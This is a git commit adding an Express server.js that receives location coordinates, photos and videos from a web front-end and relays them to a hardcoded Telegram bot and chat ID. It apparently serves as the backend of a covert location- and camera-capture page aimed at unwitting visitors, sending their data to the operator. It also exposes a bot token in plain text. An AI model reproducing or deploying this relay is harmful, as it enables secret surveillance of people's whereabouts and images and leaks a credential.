5ec6354d8ab61d06085b924bda970bca42d3e5f9
Adriansah <62455383+cyberteam322@users.noreply.github.com>
2026-03-09 03:26:41 +0700

    Add files via upload

---
+++ server.js
@@ -0,0 +1,55 @@
+import express from "express";
+import axios from "axios";
+import multer from "multer";
+import cors from "cors";
+import fs from "fs";
+import FormData from "form-data";
+
+const app = express();
+app.use(cors());
+app.use(express.json());
+app.use(express.static("public")); 
+
+if (!fs.existsSync("uploads")) fs.mkdirSync("uploads");
+const upload = multer({ dest: "uploads/" });
+
+// --- KONFIGURASI ---
+const TOKEN = "8324052332:AAFG1Jq56p61D-FB8h9Go4BYA_pOkbUsCn4";
+const CHAT_ID = "5698334372";
+
+app.post("/kirim-lokasi", async (req, res) => {
+    try {
+        await axios.post(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
+            chat_id: CHAT_ID, latitude: req.body.latitude, longitude: req.body.longitude
+        });
+        res.json({ status: "ok" });
+    } catch (err) { res.status(500).send(err.message); }
+});
+
+app.post("/kirim-foto", upload.single("photo"), async (req, res) => {
+    try {
+        const fd = new FormData();
+        fd.append("chat_id", CHAT_ID);
+        fd.append("photo", fs.createReadStream(req.file.path));
+        await axios.post(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, fd, { headers: fd.getHeaders() });
+        fs.unlinkSync(req.file.path);
+        res.json({ status: "ok" });
+    } catch (err) { if(req.file) fs.unlinkSync(req.file.path); res.status(500).send(err.message); }
+});
+
+app.post("/kirim-video", upload.single("video"), async (req, res) => {
+    try {
+        const fd = new FormData();
+        fd.append("chat_id", CHAT_ID);
+        fd.append("video", fs.createReadStream(req.file.path));
+        await axios.post(`https://api.telegram.org/bot${TOKEN}/sendVideo`, fd, {
+            headers: fd.getHeaders(),
+            maxContentLength: Infinity,
+            maxBodyLength: Infinity
+        });
+        fs.unlinkSync(req.file.path);
+        res.json({ status: "ok" });
+    } catch (err) { if(req.file) fs.unlinkSync(req.file.path); res.status(500).send(err.message); }
+});
+
+app.listen(3000, () => console.log("Server Berjalan di http://localhost:3000"));
